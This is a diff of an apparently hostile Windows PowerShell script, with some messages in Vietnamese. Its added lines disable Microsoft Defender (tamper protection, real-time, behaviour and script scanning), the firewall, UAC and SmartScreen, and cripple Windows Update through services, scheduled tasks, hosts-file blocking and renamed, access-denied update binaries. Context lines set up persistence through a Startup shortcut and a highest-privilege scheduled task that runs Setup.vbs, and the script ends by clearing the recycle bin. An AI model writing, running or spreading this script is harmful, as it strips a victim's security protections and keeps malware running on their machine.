@@ -1,6 +1,3 @@
-Set-MpPreference -PUAProtection 0
-Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'PUAProtection' -Value 0
-Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*" -Force
 $source = "C:\Users\Public\Downloads\Autorun.vbs"
 $destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.vbs.lnk"
 $WshShell = New-Object -ComObject WScript.Shell
@@ -19,56 +16,101 @@ $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Eve
 $acl.AddAccessRule($accessRule)
 Set-Acl -Path $folder -AclObject $acl
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device' /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f
-Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1
-Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2
-Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "AutoAdminLogon" -Value "1"
-New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Force
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Name "Enabled" -Type DWord -Value 0
-set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "AllowDomainPINLogon" -Type DWord -Value 0
-Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\RebootRequired" -Name * -ErrorAction SilentlyContinue
+
+Stop-Service -Name "WSearch" -Force
+Set-Service -Name "WSearch" -StartupType Disabled
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 Set-MpPreference -DisableRealtimeMonitoring $true
-Stop-Service -Name wuauserv -Force
-Set-Service -Name wuauserv -StartupType Disabled
-Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveActive' -Value '0'
-Set-Service -Name wuauserv -StartupType Disabled
-$pause = (Get-Date).AddDays(35)
-$pause = $pause.ToUniversalTime().ToString( "2029-07-31T00:00:00Z" )
-$pause_start = (Get-Date)
-$pause_start = $pause_start.ToUniversalTime().ToString( "yyyy-MM-ddTHH:mm:ssZ" )
-Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseUpdatesExpiryTime' -Value $pause                        
+Set-MpPreference -SubmitSamplesConsent 2
+Set-MpPreference -MAPSReporting 0
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableBlockAtFirstSeen $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableIntrusionPreventionSystem $true
+Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -DisableArchiveScanning $true
+Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f
+Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
+Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
+
+$services = @("wuauserv","UsoSvc","BITS","DoSvc","WaaSMedicSvc","SIHClient")
+foreach ($svc in $services) {
+    Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
+    Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
+}
+
+Remove-Item -Path C:\Windows\SoftwareDistribution\Download\* -Recurse -Force -ErrorAction SilentlyContinue
+$tasks = @(
+    "\Microsoft\Windows\UpdateOrchestrator\Reboot",
+    "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan",
+    "\Microsoft\Windows\UpdateOrchestrator\UpdateModel",
+    "\Microsoft\Windows\WindowsUpdate\Scheduled Start",
+    "\Microsoft\Windows\WindowsUpdate\sih"
+)
+foreach ($task in $tasks) {
+    try { schtasks /Delete /TN $task /F } catch {}
+}
+$pause = (Get-Date).AddDays(35).ToUniversalTime().ToString("2029-07-31T00:00:00Z")
+$pause_start = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseUpdatesStartTime' -Value $pause_start
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseUpdatesExpiryTime' -Value $pause
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseFeatureUpdatesStartTime' -Value $pause_start
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseFeatureUpdatesEndTime' -Value $pause
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseQualityUpdatesStartTime' -Value $pause_start
-Set-itemproperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseQualityUpdatesEndTime' -Value $pause
-Set-itemproperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseUpdatesStartTime' -Value $pause_start
-New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' -Force
-New-ItemProperty -Path  'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' -Name 'NoAutoUpdate' -PropertyType DWORD -Value 1
-Set-MpPreference -DisableRealtimeMonitoring $true
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseQualityUpdatesEndTime' -Value $pause
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "DisableWindowsUpdateAccess" -PropertyType DWORD -Value 1 -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -PropertyType DWORD -Value 1 -Force
+reg add "HKLM\SOFTWARE\Microsoft\WindowsSelfHost\UI\Visibility" /v "HideInsiderPage" /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" /v HideMCTLink /t REG_DWORD /d 1 /f
+$hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
+$updateHosts = @"
+127.0.0.1 update.microsoft.com
+127.0.0.1 windowsupdate.microsoft.com
+127.0.0.1 download.windowsupdate.com
+127.0.0.1 wustat.windows.com
+127.0.0.1 ntservicepack.microsoft.com
+127.0.0.1 stats.microsoft.com
+127.0.0.1 fe2.update.microsoft.com
+127.0.0.1 sls.update.microsoft.com
+127.0.0.1 test.stats.update.microsoft.com
+"@
+Add-Content -Path $hostsPath -Value $updateHosts
+$updateFiles = @(
+    "$env:windir\System32\usoclient.exe",
+    "$env:windir\System32\SIHClient.exe",
+    "$env:windir\System32\UsoClient.exe",
+    "$env:windir\System32\WaaSMedic"
+)
+foreach ($file in $updateFiles) {
+    if (Test-Path $file) {
+        try {
+            Rename-Item -Path $file -NewName ($file + ".disabled") -Force -ErrorAction SilentlyContinue
+            icacls ($file + ".disabled") /deny "SYSTEM:(F)" | Out-Null
+        } catch {
+            Write-Host "Không thể xử lý $file"
+        }
+    }
+}
+$updateAssistant = "C:\Windows\UpdateAssistant"
+if (Test-Path $updateAssistant) {
+    try {
+        Remove-Item -Path $updateAssistant -Recurse -Force -ErrorAction SilentlyContinue
+    } catch {
+        Write-Host "Không thể xóa Update Assistant"
+    }
+}
+
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
-Set-MpPreference -DisableRealtimeMonitoring $true
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
-Set-MpPreference -DisableRealtimeMonitoring $true
-Remove-Item -Path C:\Windows\SoftwareDistribution\Download\* -Recurse -Force
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device" /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoRebootWithLoggedOnUsers /t REG_DWORD /d 1 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v AUOptions /t REG_DWORD /d 2 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
-Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1
-Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2
-New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name NoAutoUpdate -Value 1 -Force
-Stop-Service -Name UsoSvc -Force
-schtasks /Change /TN "\Microsoft\Windows\UpdateOrchestrator\Reboot" /DISABLE
-schtasks /Query /TN "\Microsoft\Windows\UpdateOrchestrator\Reboot"
-Get-ScheduledTask | Where-Object {$_.TaskPath -like "\Microsoft\Windows\WindowsUpdate*"} | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false}
-Get-ScheduledTask | Where-Object {$_.TaskName -like "*reboot*" -or $_.TaskName -like "*restart*"} | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false}
-Get-ScheduledTask | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath -Confirm:$false}
-Clear-RecycleBin -Force
+Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveActive' -Value '0'
+
 $taskName = "Run Setup.vbs Daily"
 $setupPath = "C:\Users\Public\Downloads\Setup.vbs"
 $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$setupPath`""
@@ -78,4 +120,6 @@ $trigger3 = New-ScheduledTaskTrigger -Daily -At 12:00PM
 $trigger4 = New-ScheduledTaskTrigger -Daily -At 6:00PM
 $principal = New-ScheduledTaskPrincipal -UserId "$env:UserName" -RunLevel Highest
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2, $trigger3, $trigger4) -Principal $principal -Force
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 exit
